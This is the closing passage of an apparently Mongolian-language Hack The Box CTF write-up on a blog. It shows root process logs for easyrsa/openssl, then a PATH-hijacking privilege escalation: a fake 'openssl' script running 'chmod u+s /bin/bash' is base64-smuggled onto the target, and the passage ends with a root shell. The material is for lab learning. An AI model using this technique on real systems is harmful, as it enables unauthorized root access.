</span></span><span style=display:flex><span><span style=color:#f92672>{</span>       <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>match<span style=color:#f92672>(</span>$0,<span style=color:#e6db74>&#34;no&#34;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>r<span style=color:#f92672>=</span>1; exit<span style=color:#f92672>}</span>  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>match<span style=color:#f92672>(</span>$0,<span style=color:#e6db74>&#34;yes&#34;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>r<span style=color:#f92672>=</span>0; exit<span style=color:#f92672>}</span>  
</span></span><span style=display:flex><span><span style=color:#f92672>}</span> END <span style=color:#f92672>{</span>exit r<span style=color:#f92672>}</span>  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1985</span>   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1987</span>   | openssl ca -utf8 -in /opt/easyrsa/pki/reqs/a.req -out /opt/easyrsa/pki/issued/a.crt.hgNfbGlQKY -config /opt/easyrsa/pki/safessl-easyrsa.cnf -extfile /opt/easyrsa/pki/extensions.temp -days <span style=color:#ae81ff>36500</span> -batch  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1988</span>   | mv /opt/easyrsa/pki/issued/a.crt.hgNfbGlQKY /opt/easyrsa/pki/issued/a.crt
</span></span></code></pre></div><p>Openssl -г compile хийх болгондоо root access ашиглаад байсан юм шиг байгаа. Тэгээд openssl -г root рүү ороход trigger болгож ашиглахад зориулж <code>/bin/bash</code> бэлдэж өгөөд <code>-p</code> -г ашиглаад <code>/root</code> - dir рүү хандаж болгох.</p><p>openssl нэртэй файл үүсгээд дотор нь:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>**#!/bin/bash**  
</span></span><span style=display:flex><span>chmod u+s /bin/bash
</span></span></code></pre></div><p>base64 рүү:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌─<span style=color:#f92672>[</span>ca4mi@ca4mi-virtualbox<span style=color:#f92672>]</span>─<span style=color:#f92672>[</span>~/Documents/htb/machine/static/www/cheat<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└──╼ $cat openssl | base64
</span></span><span style=display:flex><span>IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo<span style=color:#f92672>=</span>
</span></span></code></pre></div><p>pki дотор decode хийнэ</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=&#34;</span> | base64 -d &gt; openssl  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cat openssl  
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash  </span>
</span></span><span style=display:flex><span>chmod u+s /bin/bash  
</span></span></code></pre></div><p>Permission нэмэх:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod <span style=color:#ae81ff>755</span> openssl
</span></span></code></pre></div><p>Path үүсгээд дотор openssl хийгээд доор байгааг ажилуулна:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>export PATH<span style=color:#f92672>=</span>/tmp/pwn:$PATH
</span></span><span style=display:flex><span>echo $PATH  
</span></span><span style=display:flex><span>/tmp/pwn:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</span></span></code></pre></div><p>Ersatool ажилууллахаар <code>usr/bin/spin</code> давхар ажиллаж байгааг ашиглах. Тэгээд create, delete, a, b, c гээд үүсгэж байгаад доор <code>/bin/bash</code> -н permission suid болж байгааг ажилгана.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@pki:/tmp/pwn$ ls -al /bin/bash  
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>1113504</span> Jun <span style=color:#ae81ff>6</span> <span style=color:#ae81ff>2019</span> /bin/bash  
</span></span><span style=display:flex><span>www-data@pki:/tmp/pwn$ /bin/bash -p  
</span></span><span style=display:flex><span>bash-4.4# cd /root/  
</span></span><span style=display:flex><span>bash-4.4# ls  
</span></span><span style=display:flex><span>notes.txt root.txt
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul><nav class=paginav><a class=prev href=https://cadil.github.io/posts/2024-02-23-htb-previse-writeup/><span class=title>« Ѳмнѳх</span><br><span>HTB - Previse</span>
</a><a class=next href=https://cadil.github.io/posts/2024-02-21-htb-bolt-writeup/><span class=title>Дараах »</span><br><span>HTB - Bolt</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="хуулах";function s(){t.innerHTML="хуулсан!",setTimeout(()=>{t.innerHTML="хуулах"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>